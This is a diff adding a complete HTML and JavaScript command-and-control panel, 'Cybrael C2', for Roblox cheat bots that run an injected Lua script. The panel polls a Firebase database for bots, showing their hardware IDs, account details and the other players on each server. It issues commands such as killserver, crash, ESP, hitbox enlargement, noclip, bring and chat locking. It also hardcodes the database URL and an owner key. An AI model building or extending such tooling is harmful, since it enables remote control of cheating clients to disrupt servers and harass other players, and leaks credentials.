@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybrael C2</title>
+<style>
+  :root {
+    --bg: #0a0a0e;
+    --panel: #121218;
+    --panel2: #18181f;
+    --border: #2a2a36;
+    --text: #ececf4;
+    --muted: #7a7a92;
+    --accent: #7b8cff;
+    --green: #4ade80;
+    --red: #f87171;
+    --yellow: #fbbf24;
+    --orange: #fb923c;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: ui-monospace, "Cascadia Code", "SF Mono", Menlo, monospace;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 18px;
+  }
+  h1 { font-size: 17px; font-weight: 600; letter-spacing: 0.05em; }
+  .sub { color: var(--muted); font-size: 11px; margin: 2px 0 16px; }
+  .layout {
+    display: grid;
+    grid-template-columns: 1fr 360px;
+    gap: 14px;
+    max-width: 1180px;
+  }
+  @media (max-width: 860px) { .layout { grid-template-columns: 1fr; } }
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 12px 14px;
+  }
+  .card h2 {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--muted);
+    margin-bottom: 10px;
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  th {
+    text-align: left; color: var(--muted); font-weight: 500;
+    padding: 5px 6px; border-bottom: 1px solid var(--border);
+  }
+  td { padding: 7px 6px; border-bottom: 1px solid var(--border); vertical-align: middle; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,0.02); }
+  .alive { color: var(--green); }
+  .stale { color: var(--yellow); }
+  .dead { color: var(--red); }
+  .btn {
+    background: var(--panel2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 6px 10px;
+    border-radius: 6px;
+    font-size: 11px;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .btn:hover { background: #22222c; border-color: #3a3a48; }
+  .btn.primary {
+    background: var(--accent);
+    border-color: transparent;
+    color: #0a0a0e;
+    font-weight: 600;
+  }
+  .btn.primary:hover { filter: brightness(1.08); }
+  .btn.danger { background: #2a1515; border-color: #4a2222; color: var(--red); }
+  .btn.sm { padding: 4px 8px; font-size: 11px; }
+  .row { display: flex; gap: 8px; margin-bottom: 8px; flex-wrap: wrap; align-items: center; }
+  input, select {
+    background: #0e0e14;
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 8px 10px;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 12px;
+    outline: none;
+  }
+  input:focus, select:focus { border-color: var(--accent); }
+  input.cmd { flex: 1; min-width: 120px; }
+  select { min-width: 160px; }
+  .log {
+    max-height: 200px;
+    overflow-y: auto;
+    font-size: 11px;
+    color: var(--muted);
+    line-height: 1.55;
+  }
+  .log .ok { color: var(--green); }
+  .log .err { color: var(--red); }
+  .section {
+    margin-top: 10px;
+    padding-top: 8px;
+    border-top: 1px solid var(--border);
+  }
+  .section label {
+    display: block;
+    font-size: 10px;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    margin-bottom: 6px;
+  }
+  .quick { display: flex; flex-wrap: wrap; gap: 5px; }
+  .empty {
+    color: var(--muted);
+    font-size: 12px;
+    padding: 24px 0;
+    text-align: center;
+  }
+  .status-dot {
+    display: inline-block;
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    margin-right: 5px;
+  }
+  .status-dot.alive { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .status-dot.stale { background: var(--yellow); }
+  .status-dot.dead { background: var(--red); }
+  .pill {
+    display: inline-block;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-size: 10px;
+    background: #1c1c26;
+    color: var(--muted);
+  }
+
+  .detail-row td {
+    background: #0e0e14;
+    border-bottom: 1px solid var(--border);
+    padding: 10px 8px;
+  }
+  .detail-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 6px 14px;
+    font-size: 11px;
+  }
+  @media (min-width: 900px) {
+    .detail-grid { grid-template-columns: 1fr 1fr 1fr; }
+  }
+  .detail-grid .k {
+    display: block;
+    color: var(--muted);
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 1px;
+  }
+  .detail-grid .v { color: var(--text); word-break: break-all; }
+  .detail-grid .mono { font-family: inherit; opacity: 0.9; }
+  button.info-btn { min-width: 24px; }
+
+
+  .player-list, .immune-list {
+    margin-top: 10px;
+    padding-top: 8px;
+    border-top: 1px solid var(--border);
+  }
+  .player-list .k, .immune-list .k {
+    display: block;
+    color: var(--muted);
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 6px;
+  }
+  .plist {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px;
+    max-height: 140px;
+    overflow-y: auto;
+  }
+  .chip {
+    background: #1a1a24;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 2px 7px;
+    font-size: 11px;
+    color: var(--text);
+  }
+  .chip.self { border-color: var(--accent); color: var(--accent); }
+  .chip.immune { border-color: var(--green); color: var(--green); }
+  .chip .uid {
+    color: var(--muted);
+    font-size: 9px;
+    margin-left: 4px;
+  }
+
+</style>
+</head>
+<body>
+  <h1>Cybrael C2</h1>
+  <p class="sub">firebase · full command set · targeted + broadcast</p>
+
+  <div class="layout">
+    <div class="card">
+      <h2>Active Bots <span id="botCount" class="pill">0</span></h2>
+      <div id="botTableWrap">
+        <div class="empty" id="emptyBots">no bots yet — run the lua script</div>
+        <table id="botTable" style="display:none">
+          <thead>
+            <tr>
+              <th></th>
+              <th>name</th>
+              <th>userid</th>
+              <th>exec</th>
+              <th>game</th>
+              <th>seen</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody id="botBody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div>
+      <div class="card" style="margin-bottom:12px">
+        <h2>Send</h2>
+        <div class="row">
+          <select id="targetSelect">
+            <option value="broadcast">⚡ ALL bots</option>
+          </select>
+        </div>
+        <div class="row">
+          <input class="cmd" id="cmdInput" placeholder="type command…" spellcheck="false" autocomplete="off">
+          <button class="btn primary" id="sendBtn">send</button>
+        </div>
+
+        <div class="section">
+          <label>combat</label>
+          <div class="quick">
+            <button class="btn sm" data-cmd="x">x stop</button>
+            <button class="btn sm" data-fill="a ">a …</button>
+            <button class="btn sm" data-fill="p ">p …</button>
+            <button class="btn sm" data-cmd="m1 on">m1 on</button>
+            <button class="btn sm" data-cmd="m1 off">m1 off</button>
+            <button class="btn sm" data-cmd="reset">reset</button>
+            <button class="btn sm danger" data-cmd="killserver">killserver</button>
+            <button class="btn sm" data-cmd="killserver stop">ks stop</button>
+          </div>
+        </div>
+
+        <div class="section">
+          <label>immune / protect</label>
+          <div class="quick">
+            <button class="btn sm" data-fill="sv ">sv …</button>
+            <button class="btn sm" data-fill="usv ">usv …</button>
+            <button class="btn sm" data-cmd="usv all">usv all</button>
+          </div>
+        </div>
+
+        <div class="section">
+          <label>movement</label>
+          <div class="quick">
+            <button class="btn sm" data-cmd="fly on">fly on</button>
+            <button class="btn sm" data-cmd="fly off">fly off</button>
+            <button class="btn sm" data-cmd="noclip on">noclip on</button>
+            <button class="btn sm" data-cmd="noclip off">noclip off</button>
+            <button class="btn sm" data-fill="ws ">ws …</button>
+            <button class="btn sm" data-cmd="ws off">ws off</button>
+            <button class="btn sm" data-cmd="cwalk on">cwalk</button>
+            <button class="btn sm" data-cmd="strafe on">strafe</button>
+            <button class="btn sm" data-cmd="orbit on">orbit</button>
+            <button class="btn sm" data-cmd="pred on">pred</button>
+          </div>
+        </div>
+
+        <div class="section">
+          <label>hitbox / other</label>
+          <div class="quick">
+            <button class="btn sm" data-cmd="hitbox on">hitbox on</button>
+            <button class="btn sm" data-cmd="hitbox off">hitbox off</button>
+            <button class="btn sm" data-fill="hitbox ">hitbox size</button>
+            <button class="btn sm" data-fill="oh ">oh …</button>
+            <button class="btn sm" data-cmd="spawn">spawn</button>
+          </div>
+        </div>
+
+        <div class="section">
+          <label>ops / cool</label>
+          <div class="quick">
+            <button class="btn sm danger" data-cmd="kick">kick self</button>
+            <button class="btn sm danger" data-cmd="panic">panic</button>
+            <button class="btn sm danger" data-cmd="crash">crash</button>
+            <button class="btn sm" data-cmd="rejoin">rejoin</button>
+            <button class="btn sm" data-fill="rejoinjob ">join job…</button>
+            <button class="btn sm" data-fill="say ">say …</button>
+            <button class="btn sm" data-fill="bring ">bring …</button>
+            <button class="btn sm" data-fill="view ">view …</button>
+            <button class="btn sm" data-cmd="view off">view off</button>
+            <button class="btn sm" data-cmd="esp">esp on</button>
+            <button class="btn sm" data-cmd="esp off">esp off</button>
+            <button class="btn sm" data-fill="info ">info …</button>
+          </div>
+        </div>
+
+        <div class="section">
+          <label>control lock</label>
+          <div class="quick">
+            <button class="btn sm danger" data-cmd="uncontrol all" title="locks chat for everyone including owners">lock chat</button>
+            <button class="btn sm" data-cmd="control unlock" title="re-enable owner chat">unlock chat</button>
+            <button class="btn sm" data-fill="control ">control …</button>
+            <button class="btn sm" data-fill="uncontrol ">uncontrol …</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>Log</h2>
+        <div class="log" id="log"></div>
+      </div>
+    </div>
+  </div>
+
+<script>
+const BASE = "https://tuffaluff-4ad76-default-rtdb.firebaseio.com";
+const OWNER_KEY = "cybrael-true-owner-9f3k";
+const POLL_MS = 2500;
+const STALE_SEC = 12;
+const DEAD_SEC = 30;
+
+const botBody = document.getElementById("botBody");
+const botTable = document.getElementById("botTable");
+const emptyBots = document.getElementById("emptyBots");
+const botCount = document.getElementById("botCount");
+const targetSelect = document.getElementById("targetSelect");
+const cmdInput = document.getElementById("cmdInput");
+const sendBtn = document.getElementById("sendBtn");
+const logEl = document.getElementById("log");
+
+let bots = {};
+
+function log(msg, cls) {
+  const d = document.createElement("div");
+  if (cls) d.className = cls;
+  d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  logEl.prepend(d);
+  while (logEl.children.length > 80) logEl.lastChild.remove();
+}
+
+function ageLabel(lastseen) {
+  if (!lastseen) return { text: "?", cls: "dead" };
+  const sec = Math.floor(Date.now() / 1000) - Number(lastseen);
+  if (sec < STALE_SEC) return { text: sec + "s", cls: "alive" };
+  if (sec < DEAD_SEC) return { text: sec + "s", cls: "stale" };
+  return { text: sec + "s", cls: "dead" };
+}
+
+function esc(s) {
+  return String(s).replace(/[&<>"']/g, c => ({
+    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+  }[c]));
+}
+
+function renderBots() {
+  const entries = Object.entries(bots);
+  botCount.textContent = entries.length;
+  if (entries.length === 0) {
+    botTable.style.display = "none";
+    emptyBots.style.display = "block";
+    targetSelect.innerHTML = `<option value="broadcast">⚡ ALL bots</option>`;
+    return;
+  }
+  emptyBots.style.display = "none";
+  botTable.style.display = "table";
+  botBody.innerHTML = "";
+
+  const prev = targetSelect.value;
+  targetSelect.innerHTML = `<option value="broadcast">⚡ ALL bots</option>`;
+
+  for (const [uid, b] of entries) {
+    const age = ageLabel(b.lastseen);
+    const tr = document.createElement("tr");
+    tr.className = "bot-row";
+    tr.dataset.uid = uid;
+    tr.innerHTML = `
+      <td><span class="status-dot ${age.cls}"></span></td>
+      <td>${esc(b.name || "?")}${b.playercount != null ? ` <span class="pill">${b.playercount}</span>` : ""}</td>
+      <td>${esc(String(b.userid || uid))}</td>
+      <td>${esc((b.executor || "?").toString().slice(0, 14))}</td>
+      <td>${esc(String(b.placeid || b.gameid || "?"))}</td>
+      <td class="${age.cls}">${age.text}</td>
+      <td>
+        <button class="btn sm" data-uid="${uid}">pick</button>
+        <button class="btn sm danger kick-btn" data-kick="${uid}">kick</button>
+        <button class="btn sm info-btn" data-info="${uid}">▾</button>
+      </td>
+    `;
+    botBody.appendChild(tr);
+
+    const detail = document.createElement("tr");
+    detail.className = "detail-row";
+    detail.dataset.for = uid;
+    detail.style.display = "none";
+    const inputBits = [
+      b.keyboard ? "kb" : null,
+      b.mouse ? "mouse" : null,
+      b.touch ? "touch" : null,
+      b.gamepad ? "pad" : null,
+      b.vr ? "vr" : null,
+    ].filter(Boolean).join(", ") || "?";
+    const players = Array.isArray(b.players) ? b.players : [];
+    const immune = Array.isArray(b.immune) ? b.immune : [];
+    const playerChips = players.map(pl => {
+      const cls = [pl.self ? "self" : "", pl.immune ? "immune" : ""].filter(Boolean).join(" ");
+      return `<span class="chip ${cls}">${esc(pl.name || "?")}<span class="uid">${esc(String(pl.userid || ""))}</span></span>`;
+    }).join("") || `<span class="chip">none</span>`;
+    const immuneChips = immune.map(n => `<span class="chip immune">${esc(n)}</span>`).join("")
+      || `<span class="chip">none</span>`;
+
+    detail.innerHTML = `
+      <td colspan="7">
+        <div class="detail-grid">
+          <div><span class="k">hwid</span><span class="v mono">${esc(b.hwid || "n/a")}</span></div>
+          <div><span class="k">display</span><span class="v">${esc(b.displayname || "?")}</span></div>
+          <div><span class="k">account age</span><span class="v">${esc(String(b.accountage ?? "?"))}d</span></div>
+          <div><span class="k">membership</span><span class="v">${esc(b.membership || "?")}</span></div>
+          <div><span class="k">place</span><span class="v">${esc(b.placename || String(b.placeid || b.gameid || "?"))}</span></div>
+          <div><span class="k">jobid</span><span class="v mono">${esc((b.jobid || "").toString().slice(0, 24))}</span></div>
+          <div><span class="k">viewport</span><span class="v">${esc(b.camera || "?")}</span></div>
+          <div><span class="k">input</span><span class="v">${esc(inputBits)}</span></div>
+          <div><span class="k">client ver</span><span class="v mono">${esc(b.robloxver || "?")}</span></div>
+          <div><span class="k">executor</span><span class="v">${esc(b.executor || "?")}</span></div>
+          <div><span class="k">players</span><span class="v">${esc(String(b.playercount ?? players.length))}</span></div>
+          <div><span class="k">immuned</span><span class="v">${esc(String(b.immunecount ?? immune.length))}</span></div>
+        </div>
+        <div class="player-list">
+          <span class="k">server players (${players.length})</span>
+          <div class="plist">${playerChips}</div>
+        </div>
+        <div class="immune-list">
+          <span class="k">immuned by this bot (${immune.length})</span>
+          <div class="plist">${immuneChips}</div>
+        </div>
+      </td>
+    `;
+    botBody.appendChild(detail);
+
+    const opt = document.createElement("option");
+    opt.value = uid;
+    opt.textContent = `${b.name || uid} (${uid})`;
+    targetSelect.appendChild(opt);
+  }
+
+  if ([...targetSelect.options].some(o => o.value === prev)) targetSelect.value = prev;
+
+  botBody.querySelectorAll("button[data-uid]").forEach(btn => {
+    btn.onclick = () => { targetSelect.value = btn.dataset.uid; cmdInput.focus(); };
+  });
+  botBody.querySelectorAll("button.info-btn").forEach(btn => {
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      const uid = btn.dataset.info;
+      const row = botBody.querySelector(`tr.detail-row[data-for="${uid}"]`);
+      if (!row) return;
+      const open = row.style.display !== "none";
+      botBody.querySelectorAll("tr.detail-row").forEach(r => r.style.display = "none");
+      botBody.querySelectorAll("button.info-btn").forEach(b => b.textContent = "▾");
+      if (!open) {
+        row.style.display = "table-row";
+        btn.textContent = "▴";
+      }
+    };
+  });
+  botBody.querySelectorAll("button.kick-btn").forEach(btn => {
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      targetSelect.value = btn.dataset.kick;
+      sendCommand("kick");
+    };
+  });
+}
+
+async function fetchBots() {
+  try {
+    const res = await fetch(`${BASE}/bots.json`);
+    if (!res.ok) throw new Error(res.status);
+    const data = await res.json();
+    bots = data && typeof data === "object" ? data : {};
+    renderBots();
+  } catch (e) {
+    log("poll failed: " + e.message, "err");
+  }
+}
+
+function makeId() {
+  return "c" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+}
+
+async function sendCommand(cmdOverride) {
+  const cmd = (cmdOverride ?? cmdInput.value).trim();
+  if (!cmd) return;
+  const target = targetSelect.value;
+  const payload = {
+    id: makeId(),
+    cmd,
+    ts: Math.floor(Date.now() / 1000),
+    from: "owner",
+    key: OWNER_KEY
+  };
+  try {
+    const url = target === "broadcast"
+      ? `${BASE}/broadcast.json`
+      : `${BASE}/cmds/${target}.json`;
+    const res = await fetch(url, {
+      method: "PUT",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) throw new Error(res.status);
+    log(`→ ${target === "broadcast" ? "ALL" : target}: ${cmd}`, "ok");
+    if (!cmdOverride) cmdInput.value = "";
+  } catch (e) {
+    log("send failed: " + e.message, "err");
+  }
+}
+
+sendBtn.onclick = () => sendCommand();
+cmdInput.addEventListener("keydown", e => { if (e.key === "Enter") sendCommand(); });
+
+document.querySelectorAll("[data-cmd]").forEach(b => {
+  b.onclick = () => sendCommand(b.dataset.cmd);
+});
+document.querySelectorAll("[data-fill]").forEach(b => {
+  b.onclick = () => { cmdInput.value = b.dataset.fill; cmdInput.focus(); };
+});
+
+fetchBots();
+setInterval(fetchBots, POLL_MS);
+log("panel online");
+</script>
+</body>
+</html>
